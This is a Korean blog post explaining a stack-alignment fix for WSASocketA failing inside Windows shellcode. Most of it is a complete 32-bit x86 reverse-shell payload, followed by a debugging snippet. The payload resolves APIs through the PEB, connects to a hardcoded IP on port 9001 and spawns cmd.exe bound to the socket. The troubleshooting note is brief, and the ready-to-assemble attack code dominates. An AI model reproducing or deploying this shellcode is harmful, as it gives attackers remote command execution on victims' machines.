---
layout: post
date: 2023-10-26
title: "Windows Shellcode 작성시에 WSASocketA 함수 사용 시 주의사항"
tags: [Windows, ]
categories: [etc, ]
---


리버스쉘에 접속하는 쉘코드를 작성하고 있었는데 왜인지는 모르겠으나 자꾸만 WSASocketA 함수에서 -1이 반환되었다.


WSAGetLastError를 통해 확인해보면 10022(WSAEINVAL) 오류라고 하는데 인수가 잘못되었다고 한다.


바이너리로 만들어서 확인해보면 잘만 되는데 쉘코드로 했을 때는 안되길래 엄청난 삽질 끝에 해결책을 알아냈다. 


해결책은 다음과 같다.


먼저, WSASocketA 함수는 사용 전에 다음과 같은 조건을 맞추어줘야 한다.

- rsp must be 16-byte aligned before the call.
- There must be 32 bytes of free space at the top of the stack before the call, which can be freely used by the called function.
- The first 4 function parameters are in rcx, rdx, r8, and r9, and the remaining parameters are on the stack starting at rsp+0x20.

대부분은 WSASocketA 함수 호출 직전 esp/rsp를 4/8의 배수로 맞춰주면 해결된다.


필자는 쉘 코드 시작시에 `sub esp, 2`를 해줌으로써 해결하였다.


### Reverse Connection Shellcode


---


{% raw %}
```text
global _start

section .text

_start:
SUB esp, 0x2 ; stack alignment for WSASocketA

; Locate Kernelbase.dll address
XOR ECX, ECX						;zero out ECX
MOV EAX, FS:[ecx + 0x30]				;EAX = PEB
MOV EAX, [EAX + 0x0c]					;EAX = PEB->Ldr
MOV ESI, [EAX + 0x14]					;ESI = PEB->Ldr.InMemoryOrderModuleList
LODSD							;memory address of the second list entry structure
XCHG EAX, ESI						;EAX = ESI , ESI = EAX
LODSD							;memory address of the third list entry structure
XCHG EAX, ESI						;EAX = ESI , ESI = EAX
LODSD							;memory address of the fourth list entry structure
MOV EBX, [EAX + 0x10]					;EBX = Base address

; Export Table
MOV EDX, DWORD  [EBX + 0x3C]			;EDX = DOS->e_lfanew
ADD EDX, EBX					;EDX = PE Header
MOV EDX, DWORD  [EDX + 0x78]			;EDX = Offset export table
ADD EDX, EBX					;EDX = Export table
MOV ESI, DWORD  [EDX + 0x20]			;ESI = Offset names table
ADD ESI, EBX					;ESI = Names table
XOR ECX, ECX					;EXC = 0

GetFunction :

INC ECX; increment counter
LODSD						;Get name offset
ADD EAX, EBX					;Get function name
CMP dword [EAX], 0x50746547			;"PteG"
JNZ SHORT GetFunction				;jump to GetFunction label if not "GetP"
CMP dword [EAX + 0x4], 0x41636F72		;"rocA"
JNZ SHORT GetFunction				;jump to GetFunction label if not "rocA"
CMP dword [EAX + 0x8], 0x65726464		;"ddre"
JNZ SHORT GetFunction				;jump to GetFunction label if not "ddre"

MOV ESI, DWORD [EDX + 0x24]	    		;ESI = Offset ordinals
ADD ESI, EBX					;ESI = Ordinals table
MOV CX,  WORD [ESI + ECX * 2]			;CX = Number of function
DEC ECX						;Decrement the ordinal
MOV ESI, DWORD [EDX + 0x1C]	    		;ESI = Offset address table
ADD ESI, EBX					;ESI = Address table
MOV EDX, DWORD [ESI + ECX * 4]			;EDX = Pointer(offset)
ADD EDX, EBX					;EDX = GetProcAddress

; Get the Address of LoadLibraryA function
XOR ECX, ECX					;ECX = 0
PUSH EBX					;Kernel32 base address
PUSH EDX					;GetProcAddress
PUSH ECX					;0
PUSH 0x41797261					;"Ayra"
PUSH 0x7262694C					;"rbiL"
PUSH 0x64616F4C					;"daoL"
PUSH ESP					;"LoadLibrary"
PUSH EBX					;Kernel32 base address
MOV  ESI, EBX					;save the kernel32 address in esi for later
CALL EDX					;GetProcAddress(LoadLibraryA)

ADD ESP, 0xC					;pop "LoadLibraryA"
POP EDX						;EDX = 0
PUSH EAX					;EAX = LoadLibraryA
PUSH EDX					;ECX = 0
MOV DX, 0x6C6C					;"ll"
PUSH EDX
PUSH 0x642E3233					;"d.23"
PUSH 0x5F327377					;"_2sw"
PUSH ESP					;"ws2_32.dll"
CALL EAX					;LoadLibrary("ws2_32.dll")

ADD  ESP, 0x10					;Clean stack
MOV  EDX, [ESP + 0x4]				;EDX = GetProcAddress
PUSH 0x61617075					;"aapu"
SUB  word [ESP + 0x2], 0x6161		 	;"pu" (remove "aa")
PUSH 0x74726174					;"trat"
PUSH 0x53415357					;"SASW"
PUSH ESP					;"WSAStartup"
PUSH EAX					;ws2_32.dll address
MOV	 EDI, EAX				;save ws2_32.dll to use it later
CALL EDX					;GetProcAddress(WSAStartup)

; Call WSAStartUp
XOR  EBX, EBX					;zero out ebx register
MOV  BX, 0x0190					;EAX = sizeof(struct WSAData)
SUB  ESP, EBX					;allocate space for the WSAData structure
PUSH ESP					;push a pointer to WSAData structure
PUSH EBX					;Push EBX as wVersionRequested
CALL EAX					;Call WSAStartUp

;Find the address of WSASocketA
ADD  ESP, 0x10					;Align the stack
XOR  EBX, EBX					;zero out the EBX register
ADD  BL, 0x4					;add 0x4 at the lower register BL
IMUL EBX, 0x64					;EBX = 0x190
MOV  EDX, [ESP + EBX]				;EDX has the address of GetProcAddress
PUSH 0x61614174					;"aaAt"
SUB  word [ESP + 0x2], 0x6161	     		;"At" (remove "aa")
PUSH  0x656b636f				;"ekco"
PUSH  0x53415357				;"SASW"
PUSH ESP					;"WSASocketA", GetProcAddress 2nd argument
MOV  EAX, EDI					;EAX now holds the ws2_32.dll address
PUSH EAX					;push the first argument of GetProcAddress
CALL EDX					;call GetProcAddress
PUSH EDI					;save the ws2_32.dll address to use it later

;call WSASocketA
XOR ECX, ECX					;zero out ECX register
PUSH 0x0
PUSH 0x0
PUSH 0x0
MOV  EDX, 0x6					;IPPROTO_TCP
;PUSH EDX					;null value for dwFlags argument
;PUSH EDX					;zero value since we dont have an existing socket group
;PUSH EDX					;null value for lpProtocolInfo
;MOV  DL, 0x6					;IPPROTO_TCP
PUSH EDX					;set the protocol argument
INC  ECX					;SOCK_STREAM(TCP)
PUSH ECX					;set the type argument
INC  ECX					;AF_INET(IPv4)
PUSH ECX					;set the ddress family specification argument
CALL EAX					;call WSASocketA
XCHG EAX, ECX					;save the socket returned from WSASocketA at EAX to ECX in order to use it later

;Find the address of connect
POP  EDI                             ;load previously saved ws2_32.dll address to ECX
ADD  ESP, 0x10                       ;Align stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x63                       ;EBX = 0x18c
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61746365                      ;"atce"
SUB  word [ESP + 0x3], 0x61	     ;"tce" (remove "a")
PUSH 0x6e6e6f63                      ;"nnoc"
PUSH ESP                             ;"connect", second argument of GetProcAddress
PUSH EDI                             ;ws32_2.dll address, first argument of GetProcAddress
XCHG ECX, EBP
CALL EDX                             ;call GetProcAddress

;call connect
PUSH 0x6a6ac92b                      ;sin_addr set to 192.168.201.11 2BC96A6A C0A8C90B
PUSH word 0xb80b		     ;port = 9001
XOR  EBX, EBX                        ;zero out EBX
add  BL, 0x2                         ;TCP protocol
PUSH word BX			     ;push the protocol value on the stack
MOV  EDX, ESP                        ;pointer to sockaddr structure (IP,Port,Protocol)
PUSH byte  16			     ;the size of sockaddr - 3rd argument of connect
PUSH EDX                             ;push the sockaddr - 2nd argument of connect
PUSH EBP                             ;socket descriptor = 64 - 1st argument of connect
XCHG EBP, EDI
CALL EAX                             ;execute connect;

;Find the address of CreateProcessA
ADD  ESP, 0x14                       ;Clean stack
XOR  EBX, EBX                        ;zero out EBX
ADD  BL, 0x4                         ;add 0x4 to lower register BL
IMUL EBX, 0x62                       ;EBX = 0x190
MOV  EDX, [ESP + EBX]                ;EDX has the address of GetProcAddress
PUSH 0x61614173                      ;"aaAs"
SUB  dword [ESP + 0x2], 0x6161	     ;"As"
PUSH 0x7365636f                      ;"seco"
PUSH 0x72506574                      ;"rPet"
PUSH 0x61657243                      ;"aerC"
PUSH ESP                             ;"CreateProcessA" - 2nd argument of GetProcAddress
MOV  EBP, ESI                        ;move the kernel32.dll to EBP
PUSH EBP                             ;kernel32.dll address - 1st argument of GetProcAddress
CALL EDX                             ;execute GetProcAddress
PUSH EAX                             ;address of CreateProcessA
LEA EBP, [EAX]                       ;EBP now points to the address of CreateProcessA

;call CreateProcessA
PUSH 0x61646d63                      ;"admc"
SUB  word [ESP + 0x3], 0x61	     ;"dmc" ( remove a)
MOV  ECX, ESP                        ;ecx now points to "cmd" string
XOR  EDX, EDX                        ;zero out EDX
SUB  ESP, 16
MOV  EBX, esp                        ;pointer for ProcessInfo

;STARTUPINFOA struct
PUSH EDI                             ;hStdError  => saved socket
PUSH EDI                             ;hStdOutput => saved socket
PUSH EDI                             ;hStdInput  => saved socket
PUSH EDX                             ;lpReserved2 => NULL
PUSH EDX                             ;cbReserved2 => NULL
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
ROL  EAX, 8                          ;EAX => 0x00000100
PUSH EAX                             ;dwFlags => STARTF_USESTDHANDLES 0x00000100
PUSH EDX                             ;dwFillAttribute => NULL
PUSH EDX                             ;dwYCountChars => NULL
PUSH EDX                             ;dwXCountChars => NULL
PUSH EDX                             ;dwYSize => NULL
PUSH EDX                             ;dwXSize => NULL
PUSH EDX                             ;dwY => NULL
PUSH EDX                             ;dwX => NULL
PUSH EDX                             ;pTitle => NULL
PUSH EDX                             ;pDesktop => NULL
PUSH EDX                             ;pReserved => NULL
XOR  EAX, EAX                        ;zero out EAX
ADD  AL, 44                          ;cb => 0x44 (size of struct)
PUSH EAX                             ;eax points to STARTUPINFOA

;ProcessInfo struct
MOV  EAX, ESP                        ;pStartupInfo
PUSH EBX                             ;pProcessInfo
PUSH EAX                             ;pStartupInfo
PUSH EDX                             ;CurrentDirectory => NULL
PUSH EDX                             ;pEnvironment => NULL
PUSH EDX                             ;CreationFlags => 0
XOR  EAX, EAX                        ;zero out EAX register
INC  EAX                             ;EAX => 0x00000001
PUSH EAX                             ;InheritHandles => TRUE => 1
PUSH EDX                             ;pThreadAttributes => NULL
PUSH EDX                             ;pProcessAttributes => NULL
PUSH ECX                             ;pCommandLine => pointer to "cmd"
PUSH EDX                             ;ApplicationName => NULL
CALL EBP                             ;execute CreateProcessA
```
{% endraw %}


### 추가 : WSAGetLastError


---


쉘코드 작성 중에 WSA 함수 관련해서 오류 확인하고 싶으면 아래 코드 추가하면 된다.


{% raw %}
```text
POP EDI ;load previously saved ws2_32.dll address to ECX
ADD ESP, 0x10 ;Align stack
XOR EBX, EBX ; Zero out the EBX register
ADD BL, 0x4 ; Add 0x4 to the lower register BL
IMUL EBX, 0x63 ; EBX = 0x194 (assuming WSAGetLastError's ordinal is the next one)
MOV EDX, [ESP + EBX] ; EDX has the address of GetProcAddress
PUSH 0x61726f72 ; "aror"
SUB word [ESP + 0x3], 0x61 ;"ror" (remove "a")
PUSH 0x72457473 ; "rEts"
PUSH 0x614c7465 ; "aLte"
PUSH 0x47415357 ; "GASW"
PUSH ESP ; "WSAGetLastError", GetProcAddress 2nd argument
MOV EAX, EDI ; EAX now holds the ws2_32.dll address
PUSH EAX ; Push the first argument of GetProcAddress
CALL EDX ; Call GetProcAddress
PUSH EDI ; Save the ws2_32.dll address to use it later

; Call WSAGetLastError
CALL EAX ; Call WSAGetLastError
```
{% endraw %}


## References


---

- [https://stackoverflow.com/questions/71521730/cannot-return-socket-descriptor-from-wsasocketa](https://stackoverflow.com/questions/71521730/cannot-return-socket-descriptor-from-wsasocketa)
- [https://www.exploit-db.com/shellcodes/50291](https://www.exploit-db.com/shellcodes/50291)
